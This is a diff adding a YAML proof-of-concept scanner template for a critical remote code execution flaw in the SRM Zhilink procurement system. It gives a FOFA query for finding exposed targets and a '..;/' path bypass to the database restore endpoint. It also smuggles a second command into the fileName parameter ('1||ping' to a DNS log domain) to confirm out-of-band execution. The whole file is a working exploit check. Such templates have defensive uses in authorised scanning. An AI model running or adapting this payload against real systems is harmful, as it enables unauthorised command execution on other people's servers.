@@ -1,0 +1,23 @@
+id: poc-yaml-srm-zhilink-restore-rce
+info:
+  name: SRM智联云采系统 restore 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: srm
+  fofa: title=="SRM 2.0"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /adpweb/static/..;/a/db/dbBackupScheme/restore
+  expression: status_code == 500 && contains(headers,"zhilink")
+- method: POST
+  path: /adpweb/static/..;/a/db/dbBackupScheme/restore
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: fileName=1||ping%20{{.domain}}
+  expression: reverse.Verify()
+transport: http
